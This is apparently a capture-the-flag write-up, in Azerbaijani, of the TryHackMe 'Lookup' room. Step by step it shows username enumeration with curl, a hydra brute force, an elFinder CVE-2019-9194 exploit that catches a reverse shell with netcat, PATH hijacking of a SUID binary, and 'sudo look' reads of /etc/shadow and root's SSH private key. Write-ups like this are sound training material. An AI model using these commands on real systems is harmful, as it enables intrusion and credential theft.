# TryHackMe — Lookup CTF Writeup (Azərbaycan dilində)

**Çətinlik:** Asan  
**Kateqoriya:** Veb, Privilege Escalation  
**Link:** https://tryhackme.com/room/lookup

---

## Xülasə

Bu CTF-də aşağıdakı addımları keçdik:
1. Nmap ilə port skan
2. Username enumeration (fərqli xəta mesajları)
3. Brute force ilə şifrə tapma
4. elFinder CVE-2019-9194 ilə RCE
5. SUID binary — PATH Hijacking ilə `think` istifadəçisinə keçid
6. `sudo look` ilə root flag oxuma

---

## 1. Kəşfiyyat (Nmap)

```bash
nmap -sV -sC -p- 10.10.x.x
```

**Açıq portlar:**
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache)

`/etc/hosts` faylına əlavə et:
```bash
echo "10.10.x.x lookup.thm" >> /etc/hosts
```

---

## 2. Veb Saytı Araşdırma

`http://lookup.thm` açıldıqda sadə login forması görünür.

### Username Enumeration

Login forması **fərqli xəta mesajları** qaytarır:

```bash
# Səhv username
curl -s -X POST http://lookup.thm/login.php \
  -d "username=wronguser&password=wrongpass"
# → "Wrong username or password"

# Düzgün username, səhv password
curl -s -X POST http://lookup.thm/login.php \
  -d "username=admin&password=wrongpass"  
# → "Wrong password"
```

Bu fərqdən istifadə edərək mövcud userləri tapırıq:

```bash
for user in admin administrator root jose john guest; do
  response=$(curl -s -X POST http://lookup.thm/login.php \
    -d "username=$user&password=wrongpass")
  if echo "$response" | grep -q "Wrong password"; then
    echo "[+] TAPILDI: $user"
  fi
done
```

**Tapılan userlar:** `admin`, `jose`

---

## 3. Brute Force

`jose` istifadəçisi üçün şifrə tapırıq:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt \
  lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" \
  -t 30 -q
```

**Tapılan şifrə:** `jose` → şifrə tapıldı!

---

## 4. elFinder RCE (CVE-2019-9194)

Login olduqdan sonra `files.lookup.thm` adresini `/etc/hosts`-a əlavə edirik:

```bash
echo "10.10.x.x files.lookup.thm" >> /etc/hosts
```

elFinder **2.1.47** versiyası — **CVE-2019-9194** zəifliyi var!

```bash
# Exploit tap
searchsploit elfinder 2.1
searchsploit -m php/webapps/46481.py

# Netcat dinlə
nc -lvnp 4444

# Exploit işlət
python3 46481.py
```

**www-data** kimi shell alırıq.

---

## 5. Privilege Escalation — think istifadəçisinə

### SUID Binary Tapma

```bash
find / -perm -4000 2>/dev/null
```

`/usr/sbin/pwm` — şübhəli SUID binary!

```bash
/usr/sbin/pwm
# [!] Running 'id' command to extract the username
# [-] File /home/www-data/.passwords not found
```

Binary `id` əmrini tam yol olmadan işlədir — **PATH Hijacking** mümkündür!

### PATH Hijacking

```bash
cd /tmp

# Saxta 'id' faylı yarat
printf '#!/bin/bash\nprintf "uid=1000(think)\n"' > id
chmod +x id

# PATH-a /tmp əlavə et
PATH=/tmp:$PATH /usr/sbin/pwm
```

Bu əmr `think` istifadəçisinin `.passwords` faylını oxuyur — şifrələr siyahısı çıxır!

```bash
# think istifadəçisinə SSH ilə gir
ssh think@lookup.thm
# tapılan şifrəni işlət
```

**User flag:** `/home/think/user.txt`

---

## 6. Privilege Escalation — Root

```bash
sudo -l
# (ALL) /usr/bin/look
```

`look` binary-si sudo ilə işləyir! GTFOBins-dən:

```bash
# /etc/shadow oxu
sudo look '' /etc/shadow

# Root private key oxu
sudo look '' /root/.ssh/id_rsa

# Root flag oxu
sudo look '' /root/root.txt
```

**Root flag tapıldı!** 🎉

---

## Öyrəndiklərimiz

| Texnika | İzah |
|---------|------|
| Username Enumeration | Fərqli xəta mesajlarından user adlarını tapmaq |
| Brute Force | Hydra ilə şifrə tapmaq |
| elFinder RCE | CVE-2019-9194 ilə command injection |
| PATH Hijacking | SUID binary-nin tam yol işlətməməsindən istifadə |
| sudo look | GTFOBins — look ilə fayl oxuma |

---

## Hücum Zənciri

```
Nmap → Username Enum → Brute Force → 
elFinder RCE → www-data shell → 
PATH Hijacking → think user → 
sudo look → ROOT FLAG
```

---

*Writeup: TryHackMe Lookup CTF — Azərbaycan dilində*
